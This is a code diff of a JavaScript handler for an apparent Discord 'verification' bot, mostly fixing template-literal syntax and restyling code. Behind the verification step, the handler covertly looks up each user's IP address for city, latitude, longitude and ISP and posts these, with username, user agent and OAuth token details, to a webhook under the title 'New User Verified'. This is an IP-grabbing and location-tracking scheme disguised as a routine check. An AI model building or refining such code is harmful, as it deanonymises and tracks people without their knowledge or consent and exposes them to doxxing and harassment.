@@ -44,33 +44,30 @@ export default async function handler(req, res) {
 
     // Fetch user info
     const userRes = await fetch("https://discord.com/api/users/@me", {
-      headers: { Authorization: Bearer ${tokenData.access_token} },
+      headers: { Authorization: `Bearer ${tokenData.access_token}` },
     });
     const userData = await userRes.json();
 
-    // Geolocation API (using ip-api.com, no key needed, free tier, limit ~45 req/min)
-    // If you want a more robust paid API, swap URL accordingly.
+    // Geolocation API
     let geoData = {};
     try {
-      const geoRes = await fetch(http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp);
+      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp`);
       const geoJson = await geoRes.json();
-      if (geoJson.status === "success") {
-        geoData = geoJson;
-      } else {
-        geoData = { error: geoJson.message || "Unknown  error" };
-      }
+      geoData = geoJson.status === "success" ? geoJson : { error: geoJson.message || "Unknown error" };
     } catch (geoErr) {
       geoData = { error: geoErr.message || "Fetch failed" };
     }
 
     // Add role to guild member
     const addRoleRes = await fetch(
-      https://discord.com/api/guilds/${guild_id}/members/${userData.id}/roles/${role_id},
+      `https://discord.com/api/guilds/${guild_id}/members/${userData.id}/roles/${role_id}`,
       {
         method: "PUT",
         headers: {
-          Authorization: Bot ${bot_token},
+          Authorization: `Bot ${bot_token}`,
+          "Content-Type": "application/json",
         },
+        body: JSON.stringify({}),
       }
     );
 
@@ -80,51 +77,53 @@ export default async function handler(req, res) {
       return res.status(500).send("Failed to assign role: " + errorText);
     }
 
-    // Prepare webhook embed fields with extended info
+    // Prepare webhook embed
     const avatarUrl = userData.avatar
-      ? https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=1024
+      ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=1024`
       : null;
 
-    const geoFields = geoData.error ? [
-      { name: "Geo Lookup Error", value: geoData.error, inline: false }
-    ] : [
-      { name: "Country", value: geoData.country || "N/A", inline: true },
-      { name: "Region", value: geoData.regionName || "N/A", inline: true },
-      { name: "City", value: geoData.city || "N/A", inline: true },
-      { name: "Latitude", value: geoData.lat?.toString() || "N/A", inline: true },
-      { name: "Longitude", value: geoData.lon?.toString() || "N/A", inline: true },
-      { name: "Timezone", value: geoData.timezone || "N/A", inline: true },
-      { name: "ISP", value: geoData.isp || "N/A", inline: false },
-    ];
+    const geoFields = geoData.error
+      ? [{ name: "Geo Lookup Error", value: geoData.error, inline: false }]
+      : [
+          { name: "Country", value: geoData.country || "N/A", inline: true },
+          { name: "Region", value: geoData.regionName || "N/A", inline: true },
+          { name: "City", value: geoData.city || "N/A", inline: true },
+          { name: "Latitude", value: geoData.lat?.toString() || "N/A", inline: true },
+          { name: "Longitude", value: geoData.lon?.toString() || "N/A", inline: true },
+          { name: "Timezone", value: geoData.timezone || "N/A", inline: true },
+          { name: "ISP", value: geoData.isp || "N/A", inline: false },
+        ];
 
     if (webhook_url) {
       await fetch(webhook_url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          embeds: [{
-            title: "New User Verified",
-            color: 0x7289DA,
-            thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
-            fields: [
-              { name: "Username", value: ${userData.username}#${userData.discriminator}, inline: true },
-              { name: "User ID", value: userData.id, inline: true },
-              { name: "IP Address", value: ip, inline: false },
-              { name: "User Agent", value: userAgent, inline: false },
-              { name: "Token Type", value: tokenData.token_type, inline: true },
-              { name: "Scope", value: tokenData.scope, inline: true },
-              { name: "Expires In (seconds)", value: tokenData.expires_in?.toString() || "unknown", inline: true },
-              ...geoFields,
-            ],
-            timestamp: new Date().toISOString(),
-          }]
+          embeds: [
+            {
+              title: "New User Verified",
+              color: 0x7289DA,
+              ...(avatarUrl ? { thumbnail: { url: avatarUrl } } : {}),
+              fields: [
+                { name: "Username", value: `${userData.username}#${userData.discriminator}`, inline: true },
+                { name: "User ID", value: userData.id, inline: true },
+                { name: "IP Address", value: ip, inline: false },
+                { name: "User Agent", value: userAgent, inline: false },
+                { name: "Token Type", value: tokenData.token_type, inline: true },
+                { name: "Scope", value: tokenData.scope, inline: true },
+                { name: "Expires In (seconds)", value: tokenData.expires_in?.toString() || "unknown", inline: true },
+                ...geoFields,
+              ],
+              timestamp: new Date().toISOString(),
+            },
+          ],
         }),
       });
     }
 
-    return res.redirect(https://discord.com/channels/${guild_id});
+    return res.redirect(`https://discord.com/channels/${guild_id}`);
   } catch (error) {
     console.error(error);
-    return res.status(500).send("Server error");
+    return res.status(500).send("Server error: " + error.message);
   }
 }
